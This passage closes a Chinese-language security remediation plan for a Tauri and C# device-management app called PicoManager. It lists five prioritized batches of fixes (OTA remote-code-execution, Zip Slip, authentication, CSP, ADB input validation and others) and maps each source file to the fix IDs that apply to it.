1. **第一批（最高优先级）**：NEW-1（OTA RCE）+ NEW-2（Zip Slip）+ P0-1（鉴权）—— 这3项堵住最严重的攻击链
2. **第二批**：NEW-3（AdbController 校验）+ P0-2（ADB 参数）+ P0-3（CSP）+ P0-4（adb_shell）+ P0-5（Deployer）+ P0-6（UDP）
3. **第三批**：P1-1～P1-13 全部
4. **第四批**：NEW-4（前端 OTA）+ NEW-5（adb 路径）+ NEW-6（扫描缓存）+ P2 清理
5. **第五批**：架构重构（P2-22 Rust adb.rs 转发）

---

## 附件：关键文件清单

```
src-tauri/
  tauri.conf.json                    (P0-3: CSP + withGlobalTauri)
  Cargo.toml
  src/
    main.rs
    lib.rs                           (P0-4: 移除 adb_shell 注册; NEW-4: 注册 ota command)
    commands/
      adb.rs                         (P0-2: 改签名; P1-1: tokio; P2-22: 转发到 C#)
      server.rs                      (P1-1/2/3: tokio + Mutex + Child + port)
      network.rs                     (P1-1: tokio UdpSocket)
      config.rs                      (P1-1/5: tokio fs + 原子写)
      ota.rs                         (NEW-4: 新建)
      mod.rs                         (NEW-4: 注册 ota 模块)
  capabilities/
    default.json                     (P1-4: 新建)
  ui/
    index.html                       (P0-3: 去 innerHTML)
    app.js                           (P0-2/3: 改调用; NEW-4: OTA 改 apiCall; P0-3: 去 innerHTML; P2-23/24)

src/PicoManager.Server/
  Program.cs                         (P0-1: ApiKeyMiddleware; P1-13: HTTPS)
  Controllers/
    AdbController.cs                 (NEW-3: 输入校验; P0-1: 鉴权)
    OtaController.cs                 (NEW-1: 鉴权; P0-1)
    ConfigController.cs              (P1-6: UDP 竞态; P1-11: 配置锁)
    DevicesController.cs             (P0-1: 鉴权)
    BatchController.cs               (P0-1: 鉴权)
    StreamController.cs              (P0-1: 鉴权)
    SystemController.cs              (P0-1: 鉴权)
  Services/
    AdbService.cs                    (NEW-5: 路径配置; NEW-6: 扫描缓存; P1-12: 转义)
    OtaService.cs                    (NEW-1: 白名单+签名; NEW-2: Zip Slip)
    UdpCommandService.cs             (P0-6: 白名单+限流; P1-6: 竞态)
    PicoSdkService.cs                (P1-7: StopAsync 等待)
    ScreenMonitorService.cs          (P1-9: 帧转换移出)
    ScreenConverter.cs               (P1-9: byte[] 接口)
    PicoDeviceManager.cs             (P1-10: 去伪唤醒; P1-11: 配置锁)
    ConfigService.cs                 (P1-11: 配置锁)
    PicoServiceModeHelper.cs         (P2-21: 去空 catch)
    SafeZipExtractor.cs              (NEW-2: 新建)
    InputValidators.cs               (NEW-3: 新建)
  Hubs/
    PicoHub.cs                       (P0-1: 鉴权)
  Models/
    SystemConfig.cs                  (P0-1: 新增 ApiKey/UdpAllowedIPs/Ota/Adb 字段)
  config.json                        (P0-1/NEW-1/NEW-5: 新增配置项)

tools/PicoDeployer/
  Program.cs                         (P0-1: 鉴权; P0-5: push-file 校验; P1-13: HTTPS)
  Core/
    AdbManager.cs                    (P1-12: 转义)
    DeploymentEngine.cs              (P1-8: SemaphoreSlim)
    DeviceRepository.cs              (P2-21: 去空 catch)
  config.json                        (P0-1: 新增 ApiKey)
```

---

> **说明**：本文档整合了第一轮审查报告 + 第二轮增量审查的全部待修项，共 **NEW-1～NEW-6 + P0-1～P0-6 + P1-1～P1-13 + P2-21～P2-25**，约 **50 项任务**。建议按第六部分的“建议执行顺序”分五批提 PR，每批 CI 通过后再进下一批。如有歧义请回溯原始审查报告或直接阅读对应源码行。